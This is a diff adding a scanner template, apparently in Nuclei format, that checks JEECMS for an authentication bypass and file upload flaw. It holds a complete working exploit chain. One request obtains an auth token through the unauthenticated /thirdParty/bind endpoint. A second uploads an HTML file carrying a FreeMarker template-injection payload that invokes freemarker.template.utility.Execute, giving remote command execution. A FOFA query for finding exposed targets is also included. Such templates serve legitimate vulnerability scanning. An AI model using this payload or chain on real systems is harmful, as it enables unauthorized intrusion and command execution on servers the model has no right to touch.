@@ -1,0 +1,58 @@
+id: jeecms-bypass-auth-file-upload
+
+info:
+  name: Jeecms Bypass Auth File Upload
+  author: zp857
+  severity: critical
+  tags: jeecms,fileupload
+  metadata:
+    fofa-query: 'app="JEECMS"'
+
+requests:
+  - raw:
+      - |
+        POST /thirdParty/bind HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username": "{{rand_text_alpha(6)}}","loginWay": 1,"loginType": "QQ","thirdId": "abcdefgdad"}
+
+      - |
+        POST /member/upload/o_upload HTTP/1.1
+        Host: {{Hostname}}
+        JEECMS-Auth-Token: {{token}}
+        Content-Type: multipart/form-data; boundary=---------------------------316085978974248253177894516
+
+        -----------------------------316085978974248253177894516
+        Content-Disposition: form-data; name="uploadFile"; filename="zpp.html"
+        Content-Type: image/html
+
+        ${site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.ObjectWrapper").getField("DEFAULT_WRAPPER").get(null).newInstance(site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.utility.Execute"), null)(cmd)}
+        -----------------------------316085978974248253177894516
+        Content-Disposition: form-data; name="typeStr"
+
+        File
+        -----------------------------316085978974248253177894516
+        Content-Disposition: form-data; name="submit"
+
+        Submit
+        -----------------------------316085978974248253177894516
+
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        internal: true
+        regex:
+          - 'JEECMS-Auth-Token":"(.*?)"'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "JEECMS-Auth-Token"
+          - "/u/cms/www/"
+
+      - type: status
+        status:
+          - 200
